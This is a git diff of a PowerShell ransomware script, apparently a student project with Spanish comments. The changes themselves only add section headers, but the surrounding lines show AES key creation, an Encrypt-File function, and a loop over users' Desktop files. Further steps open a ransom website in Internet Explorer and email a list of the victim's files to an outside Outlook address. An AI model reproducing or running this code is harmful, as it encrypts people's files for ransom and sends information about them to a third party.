@@ -1,5 +1,9 @@
-﻿cd .\Desktop
 
+## --------------------------------------------------------------------------##
+
+## CREACION DE LA CLAVE
+
+## --------------------------------------------------------------------------##
 function Create-AESKey() {
 
     ## FUNCION PARA GENERAR LA CLAVE DE ENCRIPTADO QUE SE USARA EN LA SIGUIENTE FUNCION
@@ -25,6 +29,9 @@ function Create-AESKey() {
 
 ## --------------------------------------------------------------------------##
 
+## CREACION FUNCION ENCRIPACION
+
+## --------------------------------------------------------------------------##
 Function Encrypt-File
 {
 
@@ -175,9 +182,10 @@ foreach($_ in Get-ChildItem C:\*\*\Desktop\* -ErrorAction SilentlyContinue)
 
 ## --------------------------------------------------------------------------##
 
+## MENSAJE DE ERROR
 
-
-## MENSAJE DE ERROR 
+## --------------------------------------------------------------------------##
+ 
 
 Function Mostrar-MensajeCuadroDialogo {
 
@@ -204,20 +212,22 @@ Mostrar-MensajeCuadroDialogo -Mensaje (
 
 ## --------------------------------------------------------------------------##
 
-
-
 ## ABRIR NAVEGADOR
+
+## --------------------------------------------------------------------------##
+ 
+
 
 $IE=new-object -com internetexplorer.application
 $IE.navigate2("http://asir2proyectoransomware.esy.es/")
 $IE.visible=$true
 
-
 ## --------------------------------------------------------------------------##
-
 
 ## MANDAR MENSAJE
 
+## --------------------------------------------------------------------------##
+ 
 
 $Files = gci -Name
 $Number = (gci).count 
@@ -239,5 +249,5 @@ Send-MailMessage -To “asir2_proyecto@outlook.es"  -From "asir2_proyecto@outloo
 
 
 
-## --------------------------------------------------------------------------##>
+## --------------------------------------------------------------------------##
 
